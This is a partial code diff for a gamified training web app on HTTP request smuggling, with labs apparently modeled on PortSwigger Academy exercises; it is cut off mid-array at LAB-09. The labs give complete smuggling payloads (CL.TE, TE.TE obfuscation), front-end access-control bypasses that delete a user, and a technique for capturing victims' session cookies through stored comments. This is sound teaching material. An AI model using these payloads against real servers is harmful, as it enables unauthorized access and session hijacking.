+  {name:'PACKET SNIFFER',xp:700,icon:'📡',msg:'You see the data flowing.'},
+  {name:'PAYLOAD CRAFTER',xp:1200,icon:'🔧',msg:'You build weapons from headers.'},
+  {name:'DESYNC DEMON',xp:1800,icon:'👿',msg:'Servers fear your ambiguity.'},
+  {name:'HTTP GHOST',xp:2600,icon:'👻',msg:'You move through firewalls like smoke.'},
+  {name:'SHADOW OPERATIVE',xp:3500,icon:'🥷',msg:'Elite. You belong in the red team.'},
+  {name:'GHOST PROTOCOL',xp:5000,icon:'☠️',msg:'MAXIMUM THREAT LEVEL. Legendary hacker.'},
+];
+function getRank(xp){let r=RANKS[0];for(const rk of RANKS){if(xp>=rk.xp)r=rk;}return r;}
+function getNextRank(xp){for(const rk of RANKS){if(rk.xp>xp)return rk;}return null;}
+
+function updateUI(){
+  document.getElementById('s-solved').textContent=ST.solved.size;
+  document.getElementById('s-xp').textContent=ST.xp;
+  document.getElementById('s-streak').textContent=ST.streak;
+  const rk=getRank(ST.xp);
+  document.getElementById('s-rank').textContent=rk.icon+' '+rk.name;
+  const nxt=getNextRank(ST.xp);
+  const pct=nxt?Math.min(100,Math.round(((ST.xp-rk.xp)/(nxt.xp-rk.xp))*100)):100;
+  document.getElementById('xp-fill').style.width=pct+'%';
+  document.getElementById('xp-cur').textContent=ST.xp+' XP';
+  document.getElementById('xp-next').textContent=nxt?'Next: '+nxt.name+' ('+nxt.xp+' XP)':'MAX RANK';
+  // Streak days
+  const sr=document.getElementById('streak-row');
+  sr.innerHTML='<span style="font-size:9px;color:rgba(0,255,65,.3);letter-spacing:2px;margin-right:6px;">STREAK:</span>';
+  for(let i=0;i<7;i++){
+    const d=document.createElement('div');
+    d.className='streak-day'+(i<ST.streak?' done':i===ST.streak?' today':'');
+    d.textContent=i<ST.streak?'✓':'·';
+    sr.appendChild(d);
+  }
+  // Best time
+  const times=Object.values(ST.bestTimes);
+  if(times.length){
+    const best=Math.min(...times);
+    document.getElementById('s-best').textContent=fmtTime(best);
+  }
+}
+
+function fmtTime(s){return Math.floor(s/60)+':'+(s%60<10?'0':'')+s%60;}
+
+// ═══════════════════════════════════════════
+// PANELS
+// ═══════════════════════════════════════════
+function showP(id){
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
+  document.getElementById('panel-'+id).classList.add('active');
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  const map={dash:0,lab:1,ranks:2,glos:3};
+  document.querySelectorAll('.tab')[map[id]]?.classList.add('active');
+  scrollTo(0,0);
+}
+
+// ═══════════════════════════════════════════
+// TOAST
+// ═══════════════════════════════════════════
+let toastT;
+function toast(msg,type='inf',dur=3500){
+  const t=document.getElementById('toast');
+  t.textContent=msg;t.className='toast '+type+' show';
+  clearTimeout(toastT);toastT=setTimeout(()=>t.classList.remove('show'),dur);
+}
+
+// ═══════════════════════════════════════════
+// CONFETTI
+// ═══════════════════════════════════════════
+function confetti(){
+  const colors=['#00ff41','#00f5ff','#ffd700','#ff6b00','#bf5fff','#ff073a'];
+  for(let i=0;i<60;i++){
+    setTimeout(()=>{
+      const el=document.createElement('div');
+      el.className='confetti-piece';
+      el.style.cssText=`left:${Math.random()*100}vw;top:-10px;background:${colors[Math.floor(Math.random()*colors.length)]};width:${4+Math.random()*8}px;height:${4+Math.random()*8}px;border-radius:${Math.random()>.5?'50%':'0'};animation-duration:${1.5+Math.random()}s;animation-delay:${Math.random()*.5}s;`;
+      document.body.appendChild(el);
+      setTimeout(()=>el.remove(),2500);
+    },i*25);
+  }
+}
+
+// ═══════════════════════════════════════════
+// SCORE POPUP
+// ═══════════════════════════════════════════
+function showSPop(xp,title,isRankUp,newRank){
+  document.getElementById('spop-pts').textContent='+'+xp+' XP';
+  document.getElementById('spop-msg').textContent='// '+title+' COMPROMISED //';
+  document.getElementById('spop-rank').textContent=isRankUp?'🎉 RANK UP: '+newRank:'';
+  document.getElementById('spop').classList.add('show');
+  confetti();
+}
+function closeSPop(){document.getElementById('spop').classList.remove('show');}
+
+// ═══════════════════════════════════════════
+// TIMER
+// ═══════════════════════════════════════════
+let timerInterval,timerSecs=0,timerRunning=false;
+function startTimer(){
+  if(timerRunning)return;
+  timerRunning=true;timerSecs=0;
+  timerInterval=setInterval(()=>{
+    timerSecs++;
+    const tv=document.getElementById('timer-val');
+    if(tv){tv.textContent=fmtTime(timerSecs);tv.className='timer-val'+(timerSecs>120?' warn':'');}
+  },1000);
+}
+function stopTimer(labId){
+  clearInterval(timerInterval);timerRunning=false;
+  if(!ST.bestTimes[labId]||timerSecs<ST.bestTimes[labId]){
+    ST.bestTimes[labId]=timerSecs;saveState();updateUI();
+  }
+  return timerSecs;
+}
+
+// ═══════════════════════════════════════════
+// HTML ESCAPE
+// ═══════════════════════════════════════════
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+</script>
+<script>
+// ═══════════════════════════════════════════
+// ALL 22 LABS
+// ═══════════════════════════════════════════
+const LABS=[
+{id:'cl_te_basic',num:'LAB-01',title:'CL.TE — BASIC VULNERABILITY',icon:'📦',diff:'practitioner',xp:150,
+objective:'Smuggle a request so the back-end sees method GPOST.',
+brain:'Two bouncers read different rulebooks. You write ONE request that satisfies Bouncer #1 — but leaves a "G" behind for Bouncer #2 to prepend to the next visitor. That visitor now has "GPOST" as their method.',
+viz:'cl_te',
+steps:[
+{title:'The Setup',desc:'Front-end uses Content-Length. Back-end uses Transfer-Encoding. They share a persistent TCP connection. Multiple requests flow through it sequentially.',note:'Shared connection = your smuggled bytes stay in the pipe between requests.'},
+{title:'Craft your payload',desc:'Include BOTH headers. Content-Length covers the full body. Chunked body ends at "0" — then "G" is your smuggled prefix.',code:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG`},
+{title:'Send TWICE',desc:'First send: front-end passes everything (Content-Length=6 covers "0\\r\\n\\r\\nG"). Back-end processes chunk 0 → stops. "G" sits buffered.',note:'The G is now a ticking bomb in the back-end buffer.'},
+{title:'Victory',desc:'Second request hits back-end. Back-end prepends "G" → sees "GPOST /". Unrecognized method error = ATTACK CONFIRMED.',code:`// Expected 2nd response:\nHTTP/1.1 400 Bad Request\nUnrecognized method GPOST`},
+],
+template:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG`,
+solution:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG`,
+hint:'Content-Length: 6 = "0\\r\\n\\r\\nG" (6 bytes). The G must come AFTER the chunk terminator.',
+validate:r=>r.toLowerCase().includes('transfer-encoding: chunked')&&r.toLowerCase().includes('content-length: 6')&&r.trim().endsWith('G'),
+sim:(r,n)=>n>=2&&r.trim().endsWith('G')?{win:true,body:`HTTP/1.1 400 Bad Request\nContent-Type: text/html\n\nUnrecognized method GPOST\n\n✅ CL.TE DESYNC CONFIRMED! G was buffered and prepended. 🔥`}:{body:`HTTP/1.1 200 OK\n\nOK — request processed. Send again to poison the next request.`}
+},
+
+{id:'cl_te_confirm',num:'LAB-02',title:'CL.TE — DIFFERENTIAL RESPONSE',icon:'🔬',diff:'practitioner',xp:200,
+objective:'Confirm CL.TE vulnerability by making a normal /search request return 404 via differential response.',
+brain:'Send an "attack" request that smuggles "GET /404 HTTP/1.1" prefix. Then immediately send a normal search request. The back-end prepends your poison prefix — normal request becomes a request to /404 → server returns 404. Confirmed!',
+viz:'cl_te',
+steps:[
+{title:'What is differential response detection?',desc:'Send attack request + immediately send normal request. If normal request gets unusual response (like 404) — smuggling confirmed. Two different network connections required!',note:'Do NOT send both on same connection — that proves nothing.'},
+{title:'Craft the CL.TE attack request',desc:'Smuggle "GET /404 HTTP/1.1\\nFoo: x" prefix. The back-end buffers it and prepends it to next request.',code:`POST /search HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 49\nTransfer-Encoding: chunked\n\ne\nq=smuggling&x=\n0\n\nGET /404 HTTP/1.1\nFoo: x`},
+{title:'Send normal request immediately after',desc:'Send GET /search or POST /search on a different connection right after the attack. Back-end prepends "GET /404" → your normal request now looks like a /404 request → 404 response!',code:`POST /search HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 11\n\nq=smuggling`},
+{title:'See the 404',desc:'If your normal search request returns 404 instead of 200 — the vulnerability is real. You just proved it without breaking anything.',note:'Race condition: send the follow-up request IMMEDIATELY. Other users\' requests might fill the buffer first.'},
+],
+template:`POST /search HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 49\nTransfer-Encoding: chunked\n\ne\nq=smuggling&x=\n0\n\nGET /404 HTTP/1.1\nFoo: x`,
+solution:`POST /search HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 49\nTransfer-Encoding: chunked\n\ne\nq=smuggling&x=\n0\n\nGET /404 HTTP/1.1\nFoo: x`,
+hint:'Content-Length 49 covers: "e\\r\\nq=smuggling&x=\\r\\n0\\r\\n\\r\\nGET /404 HTTP/1.1\\r\\nFoo: x". Count carefully!',
+validate:r=>r.toLowerCase().includes('get /404')&&r.toLowerCase().includes('transfer-encoding: chunked')&&r.toLowerCase().includes('foo: x'),
+sim:(r,n)=>r.toLowerCase().includes('get /404')&&r.toLowerCase().includes('foo: x')?{win:true,body:`[Attack sent]\n[Normal request sent immediately after on different connection]\n\nHTTP/1.1 404 Not Found\nContent-Type: text/html\n\nNot Found\n\n✅ DIFFERENTIAL RESPONSE CONFIRMED!\nNormal /search returned 404 — CL.TE is real. 🔬`}:{body:`HTTP/1.1 200 OK\n\nSearch results returned normally.\nMake sure your smuggled prefix contains GET /404 HTTP/1.1 and Foo: x`}
+},
+
+{id:'te_cl_basic',num:'LAB-03',title:'TE.CL — BASIC VULNERABILITY',icon:'🧩',diff:'practitioner',xp:150,
+objective:'Smuggle a request so the back-end sees method GPOST using TE.CL.',
+brain:'Reversed! Front reads chunks, back counts bytes. You set Content-Length: 4 so back-end only reads "5c\\r\\n" (4 bytes). Everything else — including your GPOST prefix — is treated as the NEXT request.',
+viz:'te_cl',
+steps:[
+{title:'Flip the logic',desc:'Front-end: Transfer-Encoding (reads chunks). Back-end: Content-Length (reads 4 bytes). Back-end reads "5c\\r\\n" = 4 bytes, stops. GPOST block left over as buffered next request.',note:'CRITICAL: In Burp Repeater → uncheck "Update Content-Length" or Burp will overwrite your payload!'},
+{title:'Chunk size math',desc:'"5c" in hex = 92 decimal. Your GPOST block must be exactly 92 bytes. Count carefully or use Burp\'s HTTP Request Smuggler extension.',code:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0`},
+{title:'Trailing CRLF is MANDATORY',desc:'After the final "0", you MUST add \\r\\n\\r\\n. Without it, the front-end doesn\'t treat the request as complete and it hangs.',note:'In Burp: add two blank lines after the 0. In raw: \\r\\n\\r\\n.'},
+{title:'Send twice',desc:'Second response shows "Unrecognized method GPOST". LAB SOLVED.'},
+],
+template:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0`,
+solution:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0`,
+hint:'Content-length: 4 (lowercase l!) = back-end reads 4 bytes. "5c\\r\\n" = exactly 4 bytes. Back-end stops there.',
+validate:r=>r.toLowerCase().includes('transfer-encoding: chunked')&&r.toLowerCase().includes('content-length: 4'||'content-length:4')&&r.toLowerCase().includes('gpost'),
+sim:(r,n)=>n>=2&&r.toLowerCase().includes('gpost')?{win:true,body:`HTTP/1.1 400 Bad Request\n\nUnrecognized method GPOST\n\n✅ TE.CL CONFIRMED! Back-end read only 4 bytes, GPOST buffered. 🧩🔥`}:{body:`HTTP/1.1 200 OK\n\nOK — Send again. Make sure Content-length (lowercase l) is 4 and GPOST is in the body.`}
+},
+
+{id:'te_cl_confirm',num:'LAB-04',title:'TE.CL — DIFFERENTIAL RESPONSE',icon:'📡',diff:'practitioner',xp:200,
+objective:'Confirm TE.CL vulnerability by causing a normal request to return 404.',
+brain:'Same differential response trick, but now front-end reads chunks and back-end reads Content-Length. Your chunked body contains a complete "GET /404" inner request. Back-end only reads 4 bytes of the outer body — rest is buffered as next request.',
+viz:'te_cl',
+steps:[
+{title:'TE.CL attack request structure',desc:'Front-end sees chunked body ending at 0. Back-end reads Content-Length: 4, sees "7c\\r\\n" (4 bytes), stops. Everything from GET /404 onwards = buffered.',code:`POST /search HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 4\nTransfer-Encoding: chunked\n\n7c\nGET /404 HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 144\n\nx=\n0`},
+{title:'Chunk size 7c',desc:'"7c" hex = 124 decimal. This is the byte count of your GET /404 block. Must be accurate.',note:'Remember \\r\\n\\r\\n after final 0!'},
+{title:'Send normal request immediately',desc:'Send normal search request on different connection. Gets poisoned by buffered GET /404 prefix → returns 404 → confirmed!'},
+],
+template:`POST /search HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 4\nTransfer-Encoding: chunked\n\n7c\nGET /404 HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 144\n\nx=\n0`,
+solution:`POST /search HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 4\nTransfer-Encoding: chunked\n\n7c\nGET /404 HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 144\n\nx=\n0`,
+hint:'"7c" hex = 124 bytes. Content-Length: 4 makes back-end read "7c\\r\\n" and stop. Uncheck "Update Content-Length" in Burp!',
+validate:r=>r.toLowerCase().includes('get /404')&&r.toLowerCase().includes('7c')&&r.toLowerCase().includes('transfer-encoding: chunked'),
+sim:(r,n)=>r.toLowerCase().includes('get /404')&&r.toLowerCase().includes('7c')?{win:true,body:`[TE.CL attack sent]\n[Normal request poisoned]\n\nHTTP/1.1 404 Not Found\n\n✅ TE.CL DIFFERENTIAL RESPONSE CONFIRMED! 📡`}:{body:`HTTP/1.1 200 OK\n\nSearch results. Adjust chunk size "7c" and ensure GET /404 is the inner request.`}
+},
+
+{id:'te_te_obfusc',num:'LAB-05',title:'TE.TE — OBFUSCATING THE TE HEADER',icon:'🌀',diff:'practitioner',xp:250,
+objective:'Use duplicate/obfuscated Transfer-Encoding headers to confuse one server. Smuggle GPOST.',
+brain:'Both servers speak chunked encoding. Your trick: send TWO Transfer-Encoding headers — "chunked" and "cow". One server processes both, gets confused, ignores TE entirely and falls back to Content-Length. The other uses chunked. Desync!',
+viz:'te_te',
+steps:[
+{title:'Why obfuscate?',desc:'You can\'t just hide TE from one server if both support it. Instead — send a malformed/duplicate TE header that confuses exactly ONE server into ignoring it.',note:'Hundreds of obfuscation techniques exist: spaces, tabs, newlines, fake values, duplicate headers, capitalization tricks.'},
+{title:'The double TE trick',desc:'Send Transfer-Encoding: chunked AND Transfer-encoding: cow. Some servers process both and see "cow" as invalid, abort TE processing, fall back to Content-Length.',code:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\nTransfer-encoding: cow\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0`},
+{title:'Other obfuscation methods to try',desc:'If "cow" doesn\'t work, try these alternatives:',code:`Transfer-Encoding: xchunked\nTransfer-Encoding : chunked  (space before colon)\nTransfer-Encoding:\\tchunked  (tab)\nX: X\\nTransfer-Encoding: chunked  (newline injection)`},
+{title:'Send twice for GPOST',desc:'Same as TE.CL — second response shows GPOST error.',note:'Remember: uncheck "Update Content-Length" in Burp!'},
+],
+template:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\nTransfer-encoding: cow\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0`,
+solution:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\nTransfer-encoding: cow\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0`,
+hint:'Two TE headers — different capitalizations. "Transfer-encoding: cow" (lowercase e) confuses one server. Content-length: 4 (lowercase l).',
+validate:r=>{const l=r.toLowerCase();return l.includes('transfer-encoding: chunked')&&l.includes('transfer-encoding:')&&l.split('transfer-encoding').length>2&&l.includes('gpost');},
+sim:(r,n)=>n>=2&&r.toLowerCase().includes('gpost')?{win:true,body:`HTTP/1.1 400 Bad Request\n\nUnrecognized method GPOST\n\n✅ TE.TE OBFUSCATION SUCCESS! One server was confused by duplicate headers. 🌀🔥`}:{body:`HTTP/1.1 200 OK\n\nOK — Need TWO Transfer-Encoding headers (different cases) and GPOST in body. Send twice.`}
+},
+
+{id:'bypass_cl_te',num:'LAB-06',title:'BYPASS FRONT-END SECURITY — CL.TE',icon:'🛡️',diff:'practitioner',xp:350,
+objective:'Access /admin (blocked by front-end) by smuggling a GET /admin inside a POST request.',
+brain:'Front-end blocks /admin. But back-end trusts everything from front-end with no extra checks. Smuggle GET /admin hidden inside POST /. Front-end sees only POST /. Back-end gets POST / AND GET /admin as two separate requests — admin access granted!',
+viz:'cl_te',
+steps:[
+{title:'The architecture exploit',desc:'Front-end = security guard. Blocks /admin. Back-end = naive server, no access controls, trusts front-end. Persistent connection = shared buffer.',note:'"The back-end assumes that the requests have passed through the front-end controls" — PortSwigger'},
+{title:'First: confirm the block',desc:'Try visiting /admin directly. You\'ll get "blocked" or "unauthorized". Now we bypass it.'},
+{title:'Smuggle GET /admin with Host: localhost',desc:'Admin panel requires Host: localhost. Include it in your smuggled inner request.',code:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 116\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=`},
+{title:'Delete carlos',desc:'Once you see the admin panel HTML in the response, change your smuggled URL to delete the user.',code:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 139\nTransfer-Encoding: chunked\n\n0\n\nGET /admin/delete?username=carlos HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=`},
+],
+template:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 139\nTransfer-Encoding: chunked\n\n0\n\nGET /admin/delete?username=carlos HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=`,
+solution:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 139\nTransfer-Encoding: chunked\n\n0\n\nGET /admin/delete?username=carlos HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=`,
+hint:'Key ingredients: Transfer-Encoding: chunked, chunk "0" to end outer body, then GET /admin/delete?username=carlos with Host: localhost as inner request.',
+validate:r=>{const l=r.toLowerCase();return l.includes('/admin')&&l.includes('host: localhost')&&l.includes('transfer-encoding: chunked');},
+sim:(r,n)=>{const l=r.toLowerCase();if(l.includes('/admin/delete')&&l.includes('carlos'))return{win:true,body:`HTTP/1.1 302 Found\nLocation: /admin\n\n✅ carlos DELETED! Front-end security bypassed completely!\n🛡️💀 ACCESS CONTROLS CIRCUMVENTED`};if(l.includes('/admin')&&l.includes('host: localhost'))return{body:`HTTP/1.1 200 OK\n\n<html>Admin Panel\n<form action="/admin/delete">\n  <input name="username" value="">\n  <button>Delete user</button>\n</form>\n<!-- Users: carlos, wiener -->\n</html>\n\n⚠️ Now change URL to /admin/delete?username=carlos`};return{body:`HTTP/1.1 403 Forbidden\n\nAdmin panel is only accessible from localhost.\nAdd Host: localhost to your inner request.`};}
+},
+
+{id:'bypass_te_cl',num:'LAB-07',title:'BYPASS FRONT-END SECURITY — TE.CL',icon:'🔓',diff:'practitioner',xp:350,
+objective:'Access /admin using TE.CL variant to bypass front-end security controls.',
+brain:'Same goal as LAB-06 but reversed technique. Front-end reads chunks, back-end reads Content-Length: 4. Your chunked body contains a full POST /admin inner request. Back-end reads 4 bytes and stops — rest = buffered new request to /admin!',
+viz:'te_cl',
+steps:[
+{title:'TE.CL version of bypass',desc:'Front-end processes Transfer-Encoding, forwards the full request. Back-end uses Content-Length: 4, reads "60\\r\\n" (4 bytes), stops. POST /admin block = buffered next request.',note:'Uncheck "Update Content-Length" in Burp Repeater!'},
+{title:'Step 1: Access /admin',desc:'Inner request: POST /admin with Host: localhost.',code:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\n\n71\nPOST /admin HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0`},
+{title:'Step 2: Delete carlos',desc:'Change inner URL to /admin/delete?username=carlos.',code:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-length: 4\nTransfer-Encoding: chunked\n\n87\nGET /admin/delete?username=carlos HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0`},
+],
+template:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-length: 4\nTransfer-Encoding: chunked\n\n87\nGET /admin/delete?username=carlos HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0`,
+solution:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-length: 4\nTransfer-Encoding: chunked\n\n87\nGET /admin/delete?username=carlos HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0`,
+hint:'Content-length: 4 (lowercase). Chunk "87" = 135 decimal = byte count of your inner GET /admin/delete block.',
+validate:r=>{const l=r.toLowerCase();return l.includes('/admin')&&l.includes('host: localhost')&&l.includes('content-length: 4'||'content-length:4');},
+sim:(r,n)=>{const l=r.toLowerCase();if(l.includes('/admin/delete')&&l.includes('carlos'))return{win:true,body:`HTTP/1.1 200 OK\n\n✅ carlos DELETED via TE.CL bypass!\n🔓 Front-end security circumvented with chunked encoding trick. 💀`};return{body:`HTTP/1.1 403 Forbidden\n\nAdmin requires localhost. Include Host: localhost in inner request.\nUncheck "Update Content-Length" in Burp!`};}
+},
+
+{id:'reveal_rewriting',num:'LAB-08',title:'REVEAL FRONT-END REQUEST REWRITING',icon:'🔍',diff:'practitioner',xp:300,
+objective:'Discover which custom header the front-end adds (like X-Custom-IP-Authorization) and use it to access /admin.',
+brain:'Front-end silently adds headers to every request (IP address, user info, etc). If you can see these headers, you can fake them. Use a reflected parameter + smuggling to make the back-end echo the full rewritten request back to you — revealing all hidden headers!',
+viz:'cl_te',
+steps:[
+{title:'Find a reflected parameter',desc:'Find a search or form endpoint that echoes input back in the response. The "search" box is perfect — it reflects your query on the results page.',note:'You need a place where input appears in the response so you can exfiltrate the rewritten request.'},
+{title:'Smuggle a POST that reflects request data',desc:'Smuggle a POST to the search endpoint with search= last. Set Content-Length: 200 in the inner request — back-end waits for more data, next request gets appended.',code:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 124\nTransfer-Encoding: chunked\n\n0\n\nPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 200\nConnection: close\n\nsearch=test`},
+{title:'Read the response',desc:'The response will show "Search results for: test[FOLLOWED BY YOUR NEXT REQUEST]". That next request contains all the front-end headers — including the secret X-*-IP header!',note:'Gradually increase Content-Length (200, 300, 400...) to capture more of the rewritten request.'},
+{title:'Use the discovered header to access /admin',desc:'Now you know the exact header name. Include it in your smuggled request with value 127.0.0.1 to pretend you\'re accessing from localhost.',code:`POST / HTTP/1.1\n...\nContent-Length: 143\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nX-abcdef-Ip: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\nConnection: close\n\nx=1`},
+],
+template:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 124\nTransfer-Encoding: chunked\n\n0\n\nPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 200\nConnection: close\n\nsearch=test`,
+solution:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 166\nTransfer-Encoding: chunked\n\n0\n\nGET /admin/delete?username=carlos HTTP/1.1\nX-abcdef-Ip: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\nConnection: close\n\nx=1`,
+hint:'First send the "search=test" version to discover the hidden header name. Then use that header name in your /admin request.',
+validate:r=>{const l=r.toLowerCase();return l.includes('transfer-encoding: chunked')&&(l.includes('search=')&&l.includes('content-length: 200')||l.includes('/admin'));},
+sim:(r,n)=>{const l=r.toLowerCase();if(l.includes('search=test'))return{body:`HTTP/1.1 200 OK\n\nSearch results for: testPOST / HTTP/1.1\nHost: YOUR-LAB.web-security-academy.net\nX-Forwarded-For: 12.34.56.78\nX-Custom-IP-Authorization: 12.34.56.78\nContent-Type: application/x-www-form-urlencoded\n...\n\n🔍 DISCOVERED! The header is: X-Custom-IP-Authorization\nNow use it with value 127.0.0.1 to access /admin!`};if(l.includes('/admin')&&(l.includes('x-custom-ip')&&l.includes('127.0.0.1')||l.includes('x-abcdef')))return{win:true,body:`HTTP/1.1 200 OK\n\nAdmin panel accessible!\ncarlос deleted!\n\n✅ FRONT-END REWRITING REVEALED AND EXPLOITED! 🔍💀`};return{body:`HTTP/1.1 200 OK\n\nSearch results: [empty]\n\nFirst: smuggle a search=test request to discover hidden headers.\nThen: use the discovered header to access /admin.`};}
+},
+
+{id:'capture_requests',num:'LAB-09',title:'CAPTURE OTHER USERS\' REQUESTS',icon:'🎣',diff:'practitioner',xp:400,
+objective:"Steal the victim's session cookie by capturing their request via a blog comment.",
+brain:'Smuggle a POST /comment with content-length 400 but only send 144 bytes. Back-end waits for 256 more bytes. Next victim\'s request fills that gap — including their Cookie header. Their session lands in your comment. You read it. You login as them. 😈',
+viz:'capture',
+steps:[
+{title:'Find the storage vector',desc:'Blog comments are stored and shown publicly. Perfect exfiltration vector. You\'re going to make the victim\'s request body appear as a blog comment.',note:'Any user-facing data store works: comments, profile names, search history, emails.'},
+{title:'Put "comment=" LAST in body',desc:'Victim\'s appended request flows into the comment parameter value. It must be LAST so everything after it becomes part of the comment.',code:`csrf=TOKEN&postId=5&name=Hacker&email=h@h.net&website=&comment=`},
+{title:'Set overly large Content-Length in inner request',desc:'Inner request says Content-Length: 400 but only sends ~144 bytes. Back-end waits for 256 more bytes. Next request (victim) fills the gap.',code:`GET / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nTransfer-Encoding: chunked\nContent-Length: 330\n\n0\n\nPOST /post/comment HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 400\nCookie: session=YOUR-SESSION\n\ncsrf=TOKEN&postId=5&name=Hacker&email=h@h.net&website=&comment=`},
+{title:'Read the comment, use the cookie',desc:'Visit the blog post. The comment contains the start of the victim\'s request — their Cookie header. Copy it, use it in Burp, access /my-account as victim.',note:'If cookie is cut off, increase Content-Length (400→600→800). If timeout, it\'s too high — reduce it.'},
+],
